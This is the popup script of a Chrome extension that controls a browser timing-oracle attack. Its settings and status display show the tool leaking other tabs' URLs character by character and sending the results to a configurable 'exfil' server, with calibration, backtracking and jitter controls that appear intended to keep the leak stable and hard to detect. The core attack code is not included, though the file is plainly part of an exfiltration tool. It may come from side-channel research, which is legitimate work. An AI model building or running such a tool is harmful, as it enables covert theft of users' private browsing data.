const DEFAULT_URL = "http://localhost:3000";

const input        = document.getElementById("serverUrl");
const saveBtn      = document.getElementById("saveBtn");
const resetBtn     = document.getElementById("resetBtn");
const saveStatus   = document.getElementById("saveStatus");
const toggleBtn    = document.getElementById("toggleBtn");
const statusVal    = document.getElementById("statusVal");
const tabVal       = document.getElementById("tabVal");
const queueVal     = document.getElementById("queueVal");
const leakUrl      = document.getElementById("leakUrl");
const progressBar  = document.getElementById("progressBar");
const progressWrap = document.getElementById("progressWrap");
const charCounter  = document.getElementById("charCounter");

const maxLenInput  = document.getElementById("maxLenInput");
const maxLenSave   = document.getElementById("maxLenSave");
const maxLenStatus = document.getElementById("maxLenStatus");

const ambigInput   = document.getElementById("ambigInput");
const ambigSave    = document.getElementById("ambigSave");
const ambigStatus  = document.getElementById("ambigStatus");

const recalibrateEveryInput  = document.getElementById("recalibrateEveryInput");
const validateEveryInput     = document.getElementById("validateEveryInput");
const backtrackLenInput      = document.getElementById("backtrackLenInput");
const nullConfirmRoundsInput = document.getElementById("nullConfirmRoundsInput");
const stabilitySave          = document.getElementById("stabilitySave");
const stabilityStatus        = document.getElementById("stabilityStatus");

const jitterEnabledChk = document.getElementById("jitterEnabled");
const jitterMinInput   = document.getElementById("jitterMin");
const jitterMaxInput   = document.getElementById("jitterMax");
const jitterSaveBtn    = document.getElementById("jitterSave");
const jitterStatus     = document.getElementById("jitterStatus");
const jitterFields     = document.getElementById("jitterFields");

let currentlyPaused = true;

// ── Persist <details> open/closed state ──
const DETAIL_IDS = ["dMaxLen", "dAmbig", "dStability", "dJitter", "dServer"];
chrome.storage.local.get("detailsOpen", ({ detailsOpen = {} }) => {
    DETAIL_IDS.forEach(id => {
        const el = document.getElementById(id);
        if (el && detailsOpen[id]) el.open = true;
    });
});
DETAIL_IDS.forEach(id => {
    const el = document.getElementById(id);
    if (!el) return;
    el.addEventListener("toggle", () => {
        chrome.storage.local.get("detailsOpen", ({ detailsOpen = {} }) => {
            detailsOpen[id] = el.open;
            chrome.storage.local.set({ detailsOpen });
        });
    });
});

// ── Max URL length control ──
chrome.storage.local.get("maxLen", ({ maxLen }) => {
    maxLenInput.value = maxLen !== undefined ? maxLen : 128;
});
maxLenSave.addEventListener("click", () => {
    const val = Math.max(1, parseInt(maxLenInput.value, 10) || 128);
    maxLenInput.value = val;
    chrome.storage.local.set({ maxLen: val }, () => {
        maxLenStatus.textContent = "\u2714 Saved.";
        setTimeout(() => (maxLenStatus.textContent = ""), 1500);
    });
});

// ── Ambiguity factor control ──
chrome.storage.local.get("ambigFactor", ({ ambigFactor }) => {
    ambigInput.value = ambigFactor !== undefined ? ambigFactor : 0.4;
});
ambigSave.addEventListener("click", () => {
    let val = parseFloat(ambigInput.value);
    if (isNaN(val) || val < 0) val = 0;
    if (val > 1) val = 1;
    ambigInput.value = val;
    chrome.storage.local.set({ ambigFactor: val }, () => {
        ambigStatus.textContent = "\u2714 Saved.";
        setTimeout(() => (ambigStatus.textContent = ""), 1500);
    });
});

// ── Oracle Stability controls ──
chrome.storage.local.get(["recalibrateEvery", "validateEvery", "backtrackLen", "nullConfirmRounds"],
    ({ recalibrateEvery, validateEvery, backtrackLen, nullConfirmRounds }) => {
        recalibrateEveryInput.value  = recalibrateEvery  !== undefined ? recalibrateEvery  : 20;
        validateEveryInput.value     = validateEvery     !== undefined ? validateEvery     : 15;
        backtrackLenInput.value      = backtrackLen      !== undefined ? backtrackLen      : 5;
        nullConfirmRoundsInput.value = nullConfirmRounds !== undefined ? nullConfirmRounds : 3;
});
stabilitySave.addEventListener("click", () => {
    const rce = Math.max(0, parseInt(recalibrateEveryInput.value,  10) || 0);
    const ve  = Math.max(0, parseInt(validateEveryInput.value,     10) || 0);
    const bl  = Math.max(0, parseInt(backtrackLenInput.value,      10) || 0);
    const ncr = Math.max(1, parseInt(nullConfirmRoundsInput.value, 10) || 1);
    recalibrateEveryInput.value  = rce;
    validateEveryInput.value     = ve;
    backtrackLenInput.value      = bl;
    nullConfirmRoundsInput.value = ncr;
    chrome.storage.local.set({ recalibrateEvery: rce, validateEvery: ve, backtrackLen: bl, nullConfirmRounds: ncr }, () => {
        stabilityStatus.textContent = "\u2714 Saved.";
        setTimeout(() => (stabilityStatus.textContent = ""), 1500);
    });
});

// ── Jitter controls ──
const syncJitterFields = (enabled) => {
    jitterFields.style.opacity = enabled ? "1" : "0.35";
    jitterFields.querySelectorAll("input").forEach(i => i.disabled = !enabled);
};
chrome.storage.local.get(["jitterEnabled", "jitterMin", "jitterMax"], ({ jitterEnabled, jitterMin, jitterMax }) => {
    const en = jitterEnabled === true; // default disabled
    jitterEnabledChk.checked = en;
    jitterMinInput.value = jitterMin !== undefined ? jitterMin : 400;
    jitterMaxInput.value = jitterMax !== undefined ? jitterMax : 1200;
    syncJitterFields(en);
});
jitterEnabledChk.addEventListener("change", () => {
    const en = jitterEnabledChk.checked;
    syncJitterFields(en);
    chrome.storage.local.set({ jitterEnabled: en });
});
jitterSaveBtn.addEventListener("click", () => {
    const en  = jitterEnabledChk.checked;
    let min   = Math.max(0, parseInt(jitterMinInput.value, 10) || 0);
    let max   = Math.max(min, parseInt(jitterMaxInput.value, 10) || 0);
    jitterMinInput.value = min;
    jitterMaxInput.value = max;
    chrome.storage.local.set({ jitterEnabled: en, jitterMin: min, jitterMax: max }, () => {
        jitterStatus.textContent = "\u2714 Saved.";
        setTimeout(() => (jitterStatus.textContent = ""), 1500);
    });
});

// ── Exfil URL controls ──
chrome.storage.local.get("exfilUrl", ({ exfilUrl }) => {
    input.value = exfilUrl || DEFAULT_URL;
});
saveBtn.addEventListener("click", async () => {
    const val = input.value.trim().replace(/\/$/, "");
    if (!val) return;
    saveStatus.style.color = "#aaa";
    saveStatus.textContent = "Testing connection\u2026";
    try {
        const res  = await fetch(`${val}/health`, { signal: AbortSignal.timeout(5000) });
        const json = await res.json();
        if (res.ok && json.ok) {
            chrome.storage.local.set({ exfilUrl: val }, () => {
                saveStatus.style.color = "#6dbf7e";
                saveStatus.textContent = "\u2714 Connected & saved.";
                setTimeout(() => (saveStatus.textContent = ""), 2500);
            });
        } else {
            saveStatus.style.color = "#e06060";
            saveStatus.textContent = "\u2716 Server responded but returned unexpected data.";
        }
    } catch (e) {
        saveStatus.style.color = "#e06060";
        saveStatus.textContent = `\u2716 Could not reach server: ${e.message}`;
    }
});
resetBtn.addEventListener("click", () => {
    input.value = DEFAULT_URL;
    chrome.storage.local.set({ exfilUrl: DEFAULT_URL }, () => {
        saveStatus.style.color = "#6dbf7e";
        saveStatus.textContent = "Reset to default.";
        setTimeout(() => (saveStatus.textContent = ""), 1500);
    });
});

// ── Start / Pause toggle ──
toggleBtn.addEventListener("click", () => {
    chrome.storage.local.set({ isPaused: !currentlyPaused });
});

// ── Live status refresh ──
const renderStatus = ({ paused, calibrating, tabId, prefix, charPos, maxLen, queueLen } = {}) => {
    currentlyPaused = !!paused;

    if (paused) {
        toggleBtn.textContent = "\u25BA Start";
        toggleBtn.className = "paused";
    } else {
        toggleBtn.textContent = "\u23F8 Pause";
        toggleBtn.className = "running";
    }

    if (tabId && calibrating) {
        statusVal.textContent        = "Calibrating";
        statusVal.className          = "status-val calibrating";
        tabVal.textContent           = `#${tabId}`;
        tabVal.className             = "status-val active";
        leakUrl.innerHTML            = '<span style="color:#f0c060;animation:blink 0.7s step-start infinite">measuring timing oracle\u2026</span>';
        progressWrap.style.display   = "block";
        progressBar.style.width      = "100%";
        progressBar.style.background = "#f0c060";
        charCounter.textContent      = "";
    } else if (tabId) {
        statusVal.textContent = "Leaking";
        statusVal.className   = "status-val active";
        tabVal.textContent    = `#${tabId}`;
        tabVal.className      = "status-val active";
        leakUrl.innerHTML     = (prefix || "") + '<span style="animation:blink 1s step-start infinite;color:#6dbf7e">&#9646;</span>';
        const pos = charPos ?? 0;
        const max = maxLen  ?? 128;
        const pct = max > 0 ? Math.min(100, Math.round(pos / max * 100)) : 0;
        progressBar.style.background = "#6dbf7e";
        progressBar.style.width      = pct + "%";
        progressWrap.style.display   = "block";
        charCounter.textContent      = `${pos} / ${max} chars`;
    } else {
        statusVal.textContent      = paused ? "Paused" : (queueLen > 0 ? "Queued" : "Idle");
        statusVal.className        = "status-val idle";
        tabVal.textContent         = "\u2014";
        tabVal.className           = "status-val idle";
        leakUrl.textContent        = "\u2014";
        progressWrap.style.display = "none";
        progressBar.style.width    = "0%";
        charCounter.textContent    = "";
    }

    queueVal.textContent = queueLen ?? 0;
};

const refresh = () => {
    chrome.storage.local.get(["leakStatus", "isPaused"], ({ leakStatus, isPaused }) => {
        const paused = isPaused !== false;
        renderStatus(leakStatus ? { ...leakStatus, paused } : { paused });
    });
};

refresh();
setInterval(refresh, 800);
